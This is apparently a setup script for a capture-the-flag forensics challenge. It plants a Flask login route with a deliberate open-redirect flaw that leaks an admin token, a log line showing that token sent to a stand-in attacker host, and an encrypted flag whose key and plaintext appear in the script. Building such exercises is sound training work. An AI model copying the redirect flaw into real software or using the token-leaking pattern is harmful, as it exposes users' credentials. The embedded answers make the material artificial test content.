#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest flask cryptography

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/evidence

    cat << 'EOF' > /home/user/evidence/login.py
from flask import Flask, request, redirect
import json
import base64

app = Flask(__name__)

def generate_admin_token():
    # Simulated token generation
    pass

@app.route('/login')
def login():
    token = generate_admin_token()
    next_url = request.args.get('next')

    # Vulnerable logic: Unvalidated redirect
    if next_url:
        return redirect(f"{next_url}?token={token}")

    return "Logged in successfully."
EOF

    cat << 'EOF' > /home/user/evidence/app.log
[2023-10-25 14:02:11] INFO: User 'guest' failed login attempt.
[2023-10-25 14:05:32] INFO: User 'admin' logged in successfully.
[2023-10-25 14:05:32] WARNING: Redirecting user to: http://evil-attacker.com/steal?token=eyJ1c2VyIjogImFkbWluIiwgImtleSI6ICJnQi1Iald3UzlrX3JfdjdFd1o1aUoxVDV5X3YycUc3bjlWM2VGX1Rfa0w4PSJ9
[2023-10-25 14:06:01] INFO: File 'stolen_data.txt' accessed by admin.
EOF

    python3 -c "
from cryptography.fernet import Fernet
key = b'gB-HjWwS9k_r_v7EwZ5iJ1T5y_v2qG7n9V3eF_T_kL8='
f = Fernet(key)
ciphertext = f.encrypt(b'FLAG{0p3n_r3d1r3ct_l34d5_t0_f3rn3t_d3crypt!0n}')
with open('/home/user/evidence/stolen_data.enc', 'wb') as out:
    out.write(ciphertext)
"

    chmod -R 777 /home/user
